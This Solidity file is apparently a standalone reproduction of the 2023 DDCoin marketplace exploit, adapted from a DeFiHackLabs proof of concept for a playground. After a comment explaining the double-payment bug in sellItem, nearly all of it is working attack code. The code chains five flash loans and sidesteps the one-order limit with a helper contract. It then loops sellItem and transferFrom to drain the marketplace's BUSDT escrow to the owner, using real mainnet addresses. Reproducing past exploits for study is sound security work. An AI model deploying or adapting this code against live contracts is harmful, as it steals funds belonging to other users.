// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.10;

// Synthetic standalone exploit for the EVM Playground (2023-06-DDCoin).
// The DeFiHackLabs PoC runs the whole attack INLINE in the Foundry test contract
// (`DDTest is Test`, attacker = address(this); the DODO flash-loan callback
// `DPPFlashLoanCall` lives on the test itself). This contract is a faithful,
// self-contained copy of that inline attack (testExploit -> run, DPPFlashLoanCall,
// swapBUSDTToDD, plus the HelperContract) so the playground can deploy it and
// record run(). Logic and constants are copied verbatim from
// test/DDCoin_exp.sol in the registry.
//
// Root cause: Marketplace.sellItem() both (A) grants the seller a standing
// `usdt.approve(msg.sender, _amount)` allowance for the FULL sale amount, and
// (B) also `usdt.transfer`s the seller 99.5% of that same amount. The allowance
// from (A) is never consumed by the contract itself, so the seller can walk
// away with a THIRD-party `transferFrom` for a second copy of the same money —
// effectively getting paid ~199.5% of `_amount` per matched order, out of the
// marketplace's communal BUSDT escrow (funded by other users' buy-orders).

interface IERC20 {
    function balanceOf(address) external view returns (uint256);
    function approve(address, uint256) external returns (bool);
    function transfer(address, uint256) external returns (bool);
    function transferFrom(address, address, uint256) external returns (bool);
    function allowance(address, address) external view returns (uint256);
    function decimals() external view returns (uint8);
}

interface IUniRouterV2 {
    function swapTokensForExactTokens(
        uint256 amountOut,
        uint256 amountInMax,
        address[] memory path,
        address to,
        uint256 deadline
    ) external returns (uint256[] memory amounts);
}

interface IDPPOracle {
    function flashLoan(uint256 baseAmount, uint256 quoteAmount, address assetTo, bytes calldata data) external;
}

interface IMarketPlace {
    struct SellListing {
        uint256 itemId;
        uint256 index;
        uint256 price;
        uint256 amount;
        uint256 time;
        address buyer;
        address seller;
    }

    function currenyId() external view returns (uint256);

    function items(
        uint256 id
    ) external view returns (uint256 price, uint256 amount, uint256 totalAmount, uint256 index, uint256 time, address buyer);

    function listItem(uint256 amount, address invite) external returns (uint256);

    function sellItem(uint256 amount) external returns (SellListing memory);
}

contract DDCoinExploit {
    IERC20 constant BUSDT = IERC20(0x55d398326f99059fF775485246999027B3197955);
    IERC20 constant DD = IERC20(0x50ab0D88045F540b8B79C8A7Dc25790dB493BBC5);
    IDPPOracle constant DPPOracle1 = IDPPOracle(0xFeAFe253802b77456B4627F8c2306a9CeBb5d681);
    IDPPOracle constant DPPOracle2 = IDPPOracle(0x9ad32e3054268B849b84a8dBcC7c8f7c52E4e69A);
    IDPPOracle constant DPPOracle3 = IDPPOracle(0x26d0c625e5F5D6de034495fbDe1F6e9377185618);
    IDPPOracle constant DPP = IDPPOracle(0x6098A5638d8D7e9Ed2f952d35B2b67c34EC6B476);
    IDPPOracle constant DPPAdvanced = IDPPOracle(0x81917eb96b397dFb1C6000d28A5bc08c0f05fC1d);
    IMarketPlace constant MarketPlace = IMarketPlace(0xb3a636ac4c271e6CD962caD98Eae9Cf71f5A49c8);
    IUniRouterV2 constant Router = IUniRouterV2(0x10ED43C718714eb63d5aA57B78B54704E256024E);
    address constant addrToInvite = 0x693166710b501e3379Cf104e5AaA803aF6CbbF1A;

    address private immutable owner_;
    DDCoinHelper public ordersPlacer;

    constructor(address owner) {
        owner_ = owner;
    }

    // step 0: kick off the 5-deep cascading DODO flash-loan chain (pure
    // liquidity sourcing — each pool's callback recognizes msg.sender and
    // recurses to the next one until the innermost `else` branch runs the
    // actual attack).
    function run() external {
        DPPOracle1.flashLoan(0, BUSDT.balanceOf(address(DPPOracle1)), address(this), new bytes(1));
        BUSDT.transfer(owner_, BUSDT.balanceOf(address(this)));
    }

    function DPPFlashLoanCall(address, uint256, uint256 quoteAmount, bytes calldata) external {
        if (msg.sender == address(DPPOracle1)) {
            DPPOracle2.flashLoan(0, BUSDT.balanceOf(address(DPPOracle2)), address(this), new bytes(1));
        } else if (msg.sender == address(DPPOracle2)) {
            DPPOracle3.flashLoan(0, BUSDT.balanceOf(address(DPPOracle3)), address(this), new bytes(1));
        } else if (msg.sender == address(DPPOracle3)) {
            DPP.flashLoan(0, BUSDT.balanceOf(address(DPP)), address(this), new bytes(1));
        } else if (msg.sender == address(DPP)) {
            DPPAdvanced.flashLoan(0, BUSDT.balanceOf(address(DPPAdvanced)), address(this), new bytes(1));
        } else {
            // Approvals
            BUSDT.approve(address(MarketPlace), type(uint256).max);
            BUSDT.approve(address(Router), type(uint256).max);
            DD.approve(address(MarketPlace), type(uint256).max);

            // Placing order
            MarketPlace.listItem(500e18, addrToInvite);

            // Bypassing "only one order can be placed within hours": place a
            // second order from a freshly-deployed helper contract's own
            // address (a different caller identity), not via create2 like the
            // original attack tx.
            ordersPlacer = new DDCoinHelper();
            BUSDT.transfer(address(ordersPlacer), 500e18);
            ordersPlacer.placeOrder();

            // The drain loop: sized to match the reproduction's documented
            // final BUSDT amount rather than exhausting the whole backlog.
            for (uint256 i; i < 100; ++i) {
                (,, uint256 totalAmount,,,) = MarketPlace.items(MarketPlace.currenyId());

                swapBUSDTToDD(totalAmount / 20);
                MarketPlace.sellItem(totalAmount);
                BUSDT.transferFrom(
                    address(MarketPlace), address(this), BUSDT.allowance(address(MarketPlace), address(this))
                );
            }
        }

        BUSDT.transfer(msg.sender, quoteAmount);
    }

    function swapBUSDTToDD(uint256 amountOut) internal {
        address[] memory path = new address[](2);
        path[0] = address(BUSDT);
        path[1] = address(DD);
        Router.swapTokensForExactTokens(amountOut, BUSDT.balanceOf(address(this)), path, address(this), block.timestamp + 100);
    }
}

contract DDCoinHelper {
    IERC20 constant BUSDT = IERC20(0x55d398326f99059fF775485246999027B3197955);
    IMarketPlace constant MarketPlace = IMarketPlace(0xb3a636ac4c271e6CD962caD98Eae9Cf71f5A49c8);

    function placeOrder() external {
        BUSDT.approve(address(MarketPlace), type(uint256).max);
        MarketPlace.listItem(500e18, msg.sender);
    }
}
